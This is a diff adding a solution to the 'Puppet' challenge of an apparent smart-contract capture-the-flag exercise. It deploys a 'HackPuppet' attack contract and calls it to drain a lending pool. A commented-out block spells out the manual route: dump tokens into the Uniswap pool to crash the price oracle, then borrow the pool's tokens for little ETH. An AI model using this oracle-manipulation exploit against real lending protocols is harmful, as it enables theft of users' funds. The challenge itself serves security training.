@@ -95,6 +95,33 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        hackPuppet = await (await ethers.getContractFactory('HackPuppet', deployer)).deploy(
+            lendingPool.address,
+            token.address,
+            uniswapExchange.address
+        );
+
+        await token.transfer(hackPuppet.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await hackPuppet.connect(player).hack(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            POOL_INITIAL_TOKEN_BALANCE,
+            {value: 24n * 10n ** 18n}
+        );
+        
+        /*
+        await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await uniswapExchange.connect(player).tokenToEthSwapInput(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            10n ** 18n,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {value: PLAYER_INITIAL_ETH_BALANCE});
+        */
+        /*
+        expect(
+            await token.balanceOf(uniswapExchange.address)
+        ).to.be.eq(0, 'Pool still has tokens');*/
     });
 
     after(async function () {
